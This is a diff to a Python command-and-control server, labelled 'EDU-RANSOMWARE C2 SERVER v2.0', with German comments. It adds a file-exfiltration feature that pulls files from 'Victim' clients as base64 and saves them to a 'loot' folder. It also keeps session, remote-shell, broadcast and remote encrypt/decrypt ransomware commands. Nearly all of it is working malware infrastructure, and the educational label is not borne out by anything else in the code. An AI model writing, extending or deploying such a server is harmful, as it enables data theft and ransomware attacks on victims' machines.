@@ -2,9 +2,24 @@ import socket
 import threading
 import subprocess
 import sys
+import os
+import base64
 import time
 
 from typing import Optional
+
+LOOT_DIR = "loot"
+
+
+# ANSI Color für Terminal Output
+class Colors:
+    HEADER = "\033[95m"
+    BLUE = "\033[94m"
+    GREEN = "\033[92m"
+    WARNING = "\033[93m"
+    FAIL = "\033[91m"
+    ENDC = "\033[0m"
+    BOLD = "\033[1m"
 
 
 # Clients Connections und IDs speichern
@@ -30,15 +45,46 @@ def handle_client(
     Returns:
         None: Keine Return, läuft als Endlosschleife
     """
-    print(f"[+] Neue Verbindung: ID {cid} from {client_address}")
+    print(
+        f"{Colors.GREEN}[+] Neue Verbindung: ID {cid} from {client_address}{Colors.ENDC}"
+    )
     clients[cid] = client_socket
 
     try:
         while True:
             # Clientantworten auf befehle erhalten
-            data = client_socket.recv(4096).decode("utf-8", errors="ignore")
+            data = client_socket.recv(1048576).decode("utf-8", errors="ignore")
             if not data:
                 break
+
+            if "EXFIL_DATA" in data:
+                try:
+                    # Format des Agents: "EXFIL_DATA:<filename>:<base64_string>"
+                    prefix, filename, b64_content = data.strip().split(":", 2)
+
+                    if not os.path.exists(LOOT_DIR):
+                        os.makedirs(LOOT_DIR)
+
+                    safe_filename = os.path.basename(filename)
+                    save_path = os.path.join(LOOT_DIR, safe_filename)
+
+                    # Decode and write
+                    with open(save_path, "wb") as f:
+                        f.write(base64.b64decode(b64_content))
+
+                    print(
+                        f"\n{Colors.GREEN}{Colors.BOLD}[!] DATA STOLEN! Saved to: {save_path}{Colors.ENDC}"
+                    )
+                    print(f"C2>", end="", flush=True)
+
+                except Exception as e:
+                    print(
+                        f"\n{Colors.FAIL}[!] Error decoding exfiltrated data: {e}{Colors.ENDC}"
+                    )
+            else:
+                print(f"\n[ID {cid}] Response: \n{data}")
+                print("C2>", end="", flush=True)
+
             print(f"\n[ID {cid}] Response: \n{data}")
 
     except Exception as e:
@@ -95,9 +141,9 @@ def send_command_to_client(cid: int, command: str) -> None:
                 clients[cid].send(command.encode("utf-8"))
                 print(f"[+] Befehl an ID {cid} gesendet")
             except Exception as e:
-                print(f"[!] Fehler beim senden an {cid}: {e}")
+                print(f"{Colors.FAIL}[!] Fehler beim senden an {cid}: {e}{Colors.ENDC}")
         else:
-            print(f"[!] Client ID {cid} konnte nicht gefunden werden")
+            print(f"{Colors.WARNING}[!] Client ID {cid} nicht gefunden{Colors.ENDC}")
 
 
 def encrypt_target(cid: int, target_path: str) -> None:
@@ -188,20 +234,34 @@ def server_shell():
         None: Läuft in einer Endlosschleife, bis `exit` angegeben wird
     """
     global client_id
+
+    if not os.path.exists(LOOT_DIR):
+        os.makedirs(LOOT_DIR)
+
+    print(f"{Colors.BOLD}--- C2 COMMAND CENTER READY ---{Colors.ENDC}")
+
     while True:
-        cmd = input("C2> ").strip()
+        try:
+            cmd = input("C2> ").strip()
+        except EOFError:
+            break
+
+        if not cmd:
+            continue
+
         if cmd == "sessions":
             list_sessions()
+
         elif cmd.startswith("interact "):
             try:
                 # Versuchen die Client ID aus dem Befehl auszulesen
                 cid = int(cmd.split()[1])
                 if cid in clients:
                     print(
-                        f"[*] Interacting with ID {cid}. Zum verlassen 'background' eingeben"
+                        f"{Colors.HEADER}[*] Interacting with ID {cid}. Type 'background' to exit.{Colors.ENDC}"
                     )
                     while True:
-                        sub_cmd = input(f"ID {cid}> ").strip()
+                        sub_cmd = input(f"ID {cid} @ Shell> ").strip()
                         if sub_cmd == "background":
                             break
                         elif sub_cmd.startswith("encrypt "):
@@ -221,6 +281,12 @@ def server_shell():
                             else:
                                 # Ohne Pfad
                                 decrypt_target(cid)
+
+                        elif sub_cmd.startswith("exfil "):
+                            send_command_to_client(cid, sub_cmd)
+                            print(
+                                f"{Colors.WARNING}[*] Waiting for data transfer...{Colors.ENDC}"
+                            )
 
                         elif sub_cmd:
                             send_command_to_client(cid, sub_cmd)
@@ -285,30 +351,49 @@ def server_shell():
             else:
                 print("[!] Usage: broadcast <command>")
 
+        elif cmd.startswith("exfil "):
+            try:
+                parts = cmd.split(" ", 2)
+                if len(parts) != 3:
+                    print(
+                        f"{Colors.WARNING}[!] Usage: exfil <client_id> <remote_filepath>{Colors.ENDC}"
+                    )
+                else:
+                    cid = int(parts[1])
+                    remote_path = parts[2]
+                    send_command_to_client(cid, f"exfil {remote_path}")
+                    print(
+                        f"{Colors.WARNING}[*] Requesting file '{remote_path}' from Victim {cid}...{Colors.ENDC}"
+                    )
+            except ValueError:
+                print("[!] Client ID muss eine Zahl sein")
+
         elif cmd == "help":
-            print("[*] Verfügbare Befehle:")
+            print(f"{Colors.HEADER}[*] Verfügbare Befehle:{Colors.ENDC}")
             print("  sessions                    - Zeige alle aktiven Sessions")
-            print("  interact <id>               - Interagiere mit einem Client")
+            print(
+                "  interact <id>               - Interagiere mit einem Client (Shell Mode)"
+            )
+            print(
+                f"  {Colors.BOLD}exfil <id> <remote_path>    - Lade Datei vom Opfer herunter (NEU!){Colors.ENDC}"
+            )
             print(
                 "  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client"
             )
             print(
-                "  decrypt <id>                - Entschlüssle Dateien auf spezifischem Client"
+                "  decrypt <id> [path]         - Entschlüssle Dateien auf spezifischem Client"
             )
             print("  broadcast <cmd>             - Sende Befehl an alle Clients")
-            print("  broadcast encrypt <path>    - Verschlüssle Pfad auf allen Clients")
-            print("  broadcast decrypt           - Entschlüssle auf allen Clients")
             print("  exit                        - Server beenden")
 
         elif cmd == "exit":
+            print(f"{Colors.FAIL}[!] Shutting down...{Colors.ENDC}")
             with lock:
                 for client_socket in clients.values():
                     client_socket.close()
-            sys.exit(0)
+            os._exit(0)
         else:
-            print(
-                "[!] Commands: sessions, interact <id>, encrypt <id> <path>, broadcast <cmd>, help, exit"
-            )
+            print("[!] Unknown command. Type 'help'.")
 
 
 def main():
@@ -327,17 +412,24 @@ def main():
         None: Läuft, bis der Server durch KeyboardInterrupt oder den `exit` Befehl gestoppt wird.
     """
     global client_id
+
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
     try:
         server.bind(("0.0.0.0", 4444))
     except OSError as e:
-        print(f"[!] Fehler beim Bindes des Ports: {e}")
+        print(f"{Colors.FAIL}[!] Fehler beim Binden des Ports: {e}{Colors.ENDC}")
         return
 
     server.listen(5)
+
     print("[*] C2 Server started on port 4444")
-    print(f"[*] Server IP: {socket.gethostbyname(socket.gethostname())}")
+    print(f"{Colors.HEADER}========================================")
+    print("    EDU-RANSOMWARE C2 SERVER v2.0")
+    print("    SERVER STARTET ON PORT 4444")
+    print(f"    Server IP: {socket.gethostbyname(socket.gethostname())}")
+    print(f"========================================{Colors.ENDC}")
 
     # Server Shell in eigenem Threat starten
     threading.Thread(target=server_shell, daemon=True).start()
